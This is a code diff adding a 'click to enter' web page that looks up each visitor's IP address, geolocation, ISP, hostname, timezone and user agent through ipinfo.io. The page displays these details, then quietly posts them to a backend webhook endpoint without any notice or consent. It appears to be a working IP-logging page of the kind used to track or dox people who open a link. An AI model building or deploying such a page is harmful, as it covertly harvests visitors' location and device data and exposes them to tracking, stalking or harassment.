@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ata.xyz</title>
+</head>
+<body>
+  <div id="enter">click to enter</div>
+  <div id="info" style="display: none;">
+    <p><strong>IP Address:</strong> <span id="ip"></span></p>
+    <p><strong>City:</strong> <span id="city"></span></p>
+    <p><strong>Region:</strong> <span id="region"></span></p>
+    <p><strong>Country:</strong> <span id="country"></span></p>
+    <p><strong>Location:</strong> <span id="location"></span></p>
+    <p><strong>Organisation:</strong> <span id="org"></span></p>
+    <p><strong>Hostname:</strong> <span id="host"></span></p>
+    <p><strong>Timezone:</strong> <span id="timezone"></span></p>
+    <p><strong>UserAgent:</strong> <span id="useragent"></span></p>
+  </div>
+
+  <script>
+    document.getElementById('enter').addEventListener('click', async function() {
+      this.style.display = 'none';
+      await fetchUserInfo();
+    });
+
+    async function fetchUserInfo() {
+      try {
+        const response = await fetch('https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN');
+        if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+        const data = await response.json();
+
+        document.getElementById('ip').textContent = data.ip;
+        document.getElementById('city').textContent = data.city;
+        document.getElementById('region').textContent = data.region;
+        document.getElementById('country').textContent = data.country;
+        document.getElementById('location').textContent = data.loc;
+        document.getElementById('org').textContent = data.org;
+        document.getElementById('host').textContent = data.hostname;
+        document.getElementById('timezone').textContent = data.timezone;
+        document.getElementById('useragent').textContent = navigator.userAgent;
+
+        document.getElementById('info').style.display = 'block';
+
+        // Send to backend API
+        await fetch('/api/send-to-webhook', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            ...data,
+            useragent: navigator.userAgent
+          })
+        });
+      } catch (error) {
+        console.error('Error fetching user information:', error);
+      }
+    }
+  </script>
+</body>
+</html>
